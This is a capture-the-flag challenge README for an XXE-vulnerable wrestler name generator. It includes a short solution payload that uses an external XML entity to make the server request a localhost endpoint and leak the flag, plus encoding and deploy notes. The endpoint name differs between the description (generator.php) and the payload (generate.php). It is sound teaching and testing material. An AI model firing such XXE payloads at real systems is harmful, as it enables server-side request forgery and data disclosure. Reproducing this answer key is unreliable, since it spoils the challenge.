# Wrestler Name Generator
Author: David Maria
## Description
An XXE challenge. Information is submitted to the name generator as XML, so you can edit the XML that's being submitted to try to include XML external entities. Instead of having to use XXE to read a file, you have to use it to make a request to the site. Since the XML is rendered on the web server, the request made by the XML parser trying to load the external entity will be coming from localhost to the web server. The generator.php endpoint is set to echo the flag when the request to it is made from localhost.
## Solution
Send the following XML payload to the name generator:
```<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://127.0.0.1/generate.php" >]>
    <input>
       <firstName>&xxe;</firstName>
       <lastName>wew</lastName>
    </input>
```

The XML should be base64 encoded, URL encoded, and sent in the input GET parameter to the generator.php endpoint.

## Deploy
Run the deploy script
 ```./deploy.sh```
 ## Maintenance
- Just restart or re-provision the Docker container.
